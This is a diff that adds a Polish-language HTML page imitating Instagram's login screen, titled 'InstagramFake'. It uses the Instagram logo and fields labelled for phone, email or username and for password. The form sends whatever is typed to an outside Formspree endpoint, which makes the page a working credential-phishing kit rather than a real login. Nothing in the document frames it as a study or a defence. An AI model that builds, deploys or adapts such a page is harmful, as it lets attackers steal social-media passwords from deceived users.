@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>InstagramFake - Zaloguj się</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #fafafa;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .login-box {
+      background: #fff;
+      padding: 40px;
+      border-radius: 8px;
+      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+      width: 350px;
+      text-align: center;
+    }
+    .logo {
+      width: 150px;
+      margin-bottom: 30px;
+    }
+    h1 {
+      font-size: 30px;
+      font-weight: 500;
+      color: #333;
+      margin-bottom: 20px;
+    }
+    input {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      font-size: 14px;
+    }
+    button {
+      width: 100%;
+      padding: 12px;
+      background-color: #3897f0;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      font-size: 14px;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #2d80d0;
+    }
+    .divider {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 20px 0;
+    }
+    .divider span {
+      margin: 0 10px;
+      font-size: 14px;
+      color: #888;
+    }
+    .login-facebook-btn {
+      width: 100%;
+      padding: 12px;
+      background-color: #4c69ba;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      font-size: 14px;
+      cursor: pointer;
+    }
+    .login-facebook-btn:hover {
+      background-color: #3b5a99;
+    }
+    .forgot-password a {
+      font-size: 12px;
+      color: #3897f0;
+      text-decoration: none;
+    }
+    .forgot-password a:hover {
+      text-decoration: underline;
+    }
+    .logo-container {
+      margin-bottom: 20px;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-box">
+    <div class="logo-container">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="InstagramFake Logo" class="logo">
+    </div>
+    <h1>InstagramFake</h1>
+    <form action="https://formspree.io/f/mldjknzw" method="POST">
+      <input type="text" name="username" placeholder="Numer telefonu, e-mail lub nazwa użytkownika" required>
+      <input type="password" name="password" placeholder="Hasło" required>
+      <button type="submit">Zaloguj się</button>
+    </form>
+    <div class="divider">
+      <span>lub</span>
+    </div>
+    <button class="login-facebook-btn">Zaloguj się przez Facebook</button>
+    <div class="forgot-password">
+      <a href="#">Nie pamiętasz hasła?</a>
+    </div>
+  </div>
+</body>
+</html>
